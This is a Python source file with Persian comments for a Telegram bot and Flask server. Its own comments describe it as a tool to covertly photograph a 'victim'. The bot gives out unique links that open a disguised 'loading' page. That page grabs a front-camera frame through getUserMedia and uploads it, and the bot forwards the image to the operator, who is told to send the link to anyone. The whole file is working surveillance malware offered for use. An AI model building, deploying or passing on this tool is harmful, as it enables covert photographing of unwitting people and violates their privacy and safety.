# telegram_camera_capture_bot.py
# یک ربات تلگرام که لینک اختصاصی می‌سازد و با باز شدن لینک در مرورگر قربانی،
# از دوربین دستگاه عکس گرفته و به ربات ارسال می‌کند.

import os
import io
import uuid
import asyncio
import logging
import base64
from flask import Flask, request, render_template_string, send_file
from threading import Thread
from PIL import Image
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# ================== پیکربندی ==================
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN")
PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")  # Render sets this automatically
ADMIN_CHAT_ID = None  # با اولین استارت مقداردهی می‌شود

# دیکشنری موقت برای نگهداری عکس‌های گرفته شده قبل از ارسال
pending_photos = {}

# ================== بخش Flask (وب سرور) ==================
app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>لطفاً صبر کنید...</title>
    <style>
        body { background: #000; color: #fff; text-align: center; padding-top: 20vh; font-family: Arial; }
        video { display: none; }
        canvas { display: none; }
    </style>
</head>
<body>
    <h2>در حال بارگیری...</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <script>
        const token = "{{ token }}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                    // ارسال عکس به سرور
                    fetch('/upload/' + token, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: dataURL })
                    }).then(res => res.json()).then(data => {
                        document.body.innerHTML = '<h2>با تشکر! می‌توانید این صفحه را ببندید.</h2>';
                    }).catch(err => {
                        document.body.innerHTML = '<h2>خطا در ارسال. لطفاً دوباره تلاش کنید.</h2>';
                    });
                    // توقف دوربین بعد از ۱ ثانیه
                    setTimeout(() => { stream.getTracks().forEach(track => track.stop()); }, 1000);
                };
            } catch (err) {
                document.body.innerHTML = '<h2>عدم دسترسی به دوربین. لطفاً مجوز را صادر کنید و دوباره تلاش کنید.</h2>';
            }
        }
        capture();
    </script>
</body>
</html>
"""

@app.route('/capture/<token>')
def capture_page(token):
    return render_template_string(HTML_TEMPLATE, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload_photo(token):
    data = request.get_json()
    if not data or 'image' not in data:
        return {"status": "error", "message": "عکسی دریافت نشد."}, 400
    try:
        # تبدیل base64 به تصویر
        image_data = base64.b64decode(data['image'].split(',')[1])
        pending_photos[token] = image_data
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}, 500

@app.route('/photo/<token>')
def get_photo(token):
    # فقط برای تست؛ در نسخه نهایی از این استفاده نمی‌کنیم
    if token in pending_photos:
        return send_file(io.BytesIO(pending_photos[token]), mimetype='image/jpeg')
    return "Not found", 404

# ================== بخش ربات تلگرام ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ADMIN_CHAT_ID
    ADMIN_CHAT_ID = update.effective_chat.id
    user_id = update.effective_user.id
    # ایجاد توکن یکتا برای این لینک
    capture_token = str(uuid.uuid4())
    # ذخیره‌سازی موقت: می‌توانیم در یک دیکشنری نگه داریم (در حافظه)
    # برای تولید یک لینک اختصاصی
    link = f"{PUBLIC_URL}/capture/{capture_token}"
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📸 گرفتن عکس", url=link)]])
    await update.message.reply_text(
        "روی دکمه زیر کلیک کنید تا دوربین فعال شود. لینک را برای هر کسی که می‌خواهید بفرستید.",
        reply_markup=keyboard
    )
    # همچنین می‌توانیم یک job برای بررسی عکس‌های دریافتی تنظیم کنیم
    # در اینجا از یک حلقه جداگانه استفاده می‌کنیم

async def poll_photos(context: ContextTypes.DEFAULT_TYPE):
    """بررسی عکس‌های جدید و ارسال به ادمین"""
    if not ADMIN_CHAT_ID:
        return
    to_remove = []
    for token, photo_data in list(pending_photos.items()):
        try:
            await context.bot.send_photo(
                chat_id=ADMIN_CHAT_ID,
                photo=io.BytesIO(photo_data),
                caption=f"📷 عکس جدید از لینک {token}"
            )
            to_remove.append(token)
        except Exception as e:
            logger.error(f"ارسال عکس با خطا مواجه شد: {e}")
    for t in to_remove:
        del pending_photos[t]

def run_flask():
    """اجرای وب سرور در یک ترد جداگانه"""
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

async def main():
    # شروع ترد Flask
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # راه‌اندازی ربات تلگرام
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))

    # بررسی دوره‌ای عکس‌های جدید (هر ۵ ثانیه)
    job_queue = application.job_queue
    job_queue.run_repeating(poll_photos, interval=5, first=5)

    logger.info("ربات و وب سرور فعال شدند...")
    await application.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
